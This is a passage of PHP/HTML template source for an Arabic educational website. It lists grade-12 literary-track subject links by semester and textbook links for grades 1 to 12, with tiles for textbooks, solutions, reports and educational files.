<a href="index-type.php?type1=196&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=199" style="font-size:18px;color:;">الفيزياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=200" style="font-size:18px;color:;">الكيمياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=201" style="font-size:18px;color:;">الاحياء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=196&amp;type=204" style="font-size:18px;color:;">الدستور    </a>        </li> </ul>  

     </span>
</div>


</div>




 















































   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الصف الثاني عشر ادبي</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثاني عشر ادبي : الفصل الاول</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=205" style="font-size:18px;color:;">فرنسي    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=206" style="font-size:18px;color:;">الاحصاء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=207" style="font-size:18px;color:;">الجغرافيا    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=208" style="font-size:18px;color:;">التاريخ    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=210" style="font-size:18px;color:;">الفلسفة    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=197&amp;type=204" style="font-size:18px;color:;">الدستور    </a>        </li>
</ul>     </span>
</div>

        

  <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">الصف الثاني عشر ادبي : الفصل الثاني</p>  
 
                                     
 
           
     <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
 <li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=147" style="font-size:18px;color:;">الانجليزية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=149" style="font-size:18px;color:;">العربية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=150" style="font-size:18px;color:;">الاسلامية    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=205" style="font-size:18px;color:;">فرنسي    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=206" style="font-size:18px;color:;">الاحصاء    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=207" style="font-size:18px;color:;">الجغرافيا    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=208" style="font-size:18px;color:;">التاريخ    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=210" style="font-size:18px;color:;">الفلسفة    </a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index-type.php?type1=198&amp;type=204" style="font-size:18px;color:;">الدستور    </a>        </li> 
 </ul>  

     </span>
</div>


</div>


 
 
 
 
 
 
 
 
 
 
   <div style="border:1px solid #020009;   border-radius: 0px;">        
<p   style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:16px;text-align:center;color:#fff;background-color: #020009;margin-top:0px;">الكتب الدراسية</p>  

 
   <div style="border:3px solid #f44336;   border-radius: 0px;margin-left:10px; margin-right:10px;margin-top:10px;margin-bottom:10px;">        

  <p style="padding: 10px; border-radius: 0px;font-family:Droid Arabic Kufi;font-size:14px;text-align:center;color:#fff;background-color: #f44336;margin-top:0px; ">كتب الفصل الأول و الثاني</p>  
                                     
            
        <ul class="category-items" style="padding-top:0px;margin-top:0px; background: url();
;"> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=94&amp;type=95" style="font-size:18px;color:;">كتب الصف الاول</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=96&amp;type=97" style="font-size:18px;color:;">كتب الصف الثاني</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=98&amp;type=99" style="font-size:18px;color:;">كتب الصف الثالث</a>        </li> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=100&amp;type=101" style="font-size:18px;color:;">كتب الصف الرابع</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=102&amp;type=103" style="font-size:18px;color:;">كتب الصف الخامس</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=104&amp;type=105" style="font-size:18px;color:;">كتب الصف السادس</a>        </li>  


<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=106&amp;type=107" style="font-size:18px;color:;">كتب الصف السابع</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=108&amp;type=109" style="font-size:18px;color:;">كتب الصف الثامن</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=110&amp;type=111" style="font-size:18px;color:;">كتب الصف التاسع</a>        </li> 
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=112&amp;type=113" style="font-size:18px;color:;">كتب الصف العاشر</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=114&amp;type=115" style="font-size:18px;color:;">كتب الصف الحادي عشر</a>        </li>  
<li style=" border: 2px solid #000 ;padding-right: 2px;padding-left: 1px;  padding-top:12px;  border-radius:   0px;margin: 1px;">
<a href="index1-sofof-kutub-dirassiya.php?type1=116&amp;type=117" style="font-size:18px;color:;">كتب الصف الثاني عشر</a>        </li>  





 
</ul>     </span>
</div>

</div>
 
 
 
 
 
 
  
 


 
</div>	





















  			 
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  			
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  		
  			
  			
  			
  			
  			
  			
  			
  			                        
           
      <center>
                 <style>
.grid-container166 {
  display: grid;
  grid-template-columns: auto auto  ; 
  grid-gap: 3px;
  background-color: #fff;
  padding: 1px;color:red;
}

.grid-container166 > div {
   text-align: center;
  padding: 1px 0;
  font-size: 13px;border: 1px solid red;border-radius: 0%;font-weight: bold;color:red;
}


</style>     
                          <center>
                 <div class="grid-container166"  style="margin-left:9px;margin-right:9px; ">      
            
<a href="index1-kutub-dirassiya.php"  
style="padding-top:0px;margin-top:0px;  background-color: #fff; /* Green */border: none;padding:2px 3px;text-align: center;text-decoration: none;display: inline-block;margin: 0px 0px;cursor: pointer;font-family: Droid Arabic Kufi;border: 3px solid #148F77; padding:2px;padding-top: 1px;padding: 12px; border-radius: 1px;">
<i><img  src="books.svg" width=120px height=120px ></i> 
<p   style="padding: 4px; border-radius: 1px;font-family:Droid Arabic Kufi;font-size:18px;text-align:center;color:#fff;background-color: #148F77; ">الكتب<br>الدراسية</p> </a>



<a href="index1-hal-kutub-dirassiya.php" title="حل الكتب المدرسية"  
style="padding-top:0px;margin-top:0px;  background-color: #fff; /* Green */border: none;padding:2px 3px;text-align: center;text-decoration: none;display: inline-block;margin: 0px 0px;cursor: pointer;font-family: Droid Arabic Kufi;border: 3px solid #633974; padding:2px;padding-top: 1px;padding: 12px; border-radius: 1px;">
<i><img  src="books (1).svg" width=120px height=120px ></i> 
<p   style="padding: 4px; border-radius: 1px;font-family:Droid Arabic Kufi;font-size:18px;text-align:center;color:#fff;background-color: #633974; ">حل الكتب<br>المدرسية</p> </a>


         </div>
          
         
         
         
         
         
         
         
         
                <div class="grid-container166"  style="margin-left:9px;margin-right:9px; ">  
                
<a href="index1-takarir-dirassiya.php" title="'التقارير المدرسية"  
style="padding-top:0px;margin-top:0px;  background-color: #fff; /* Green */border: none;padding:2px 3px;text-align: center;text-decoration: none;display: inline-block;margin: 0px 0px;cursor: pointer;font-family: Droid Arabic Kufi;border: 3px solid #CB4335; padding:2px;padding-top: 1px;padding: 12px; border-radius: 1px;">
<i><img  src="books (2).svg" width=120px height=120px ></i> 
<p   style="padding: 4px; border-radius: 1px;font-family:Droid Arabic Kufi;font-size:18px;text-align:center;color:#fff;background-color: #CB4335; ">التقارير<br>المدرسية</p> </a>


<a href="index1-milafat-taalimiya.php" title="الملفات التعليمية"  
style="padding-top:0px;margin-top:0px;  background-color: #fff; /* Green */border: none;padding:2px 3px;text-align: center;text-decoration: none;display: inline-block;margin: 0px 0px;cursor: pointer;font-family: Droid Arabic Kufi;border: 3px solid #2874A6; padding:2px;padding-top: 1px;padding: 12px; border-radius: 1px;">
<i><img  src="bag.svg" width=120px height=120px ></i> 
<p   style="padding: 4px; border-radius: 1px;font-family:Droid Arabic Kufi;font-size:18px;text-align:center;color:#fff;background-color: #2874A6; ">الملفات<br>التعليمية</p> </a>




         </div>
         
         
         
         
         
         
         
         
         
         
         
         
         
         
         
</center>              
    


       
       
       
       
       
       
       
       
       
       
       
       
    
    
    

    
    
    
    
    
    

    
    
    
   
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
             

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
                   
</div> 


 



</div></section>
<?php  include('footer1.php');  
}
?>
 
  
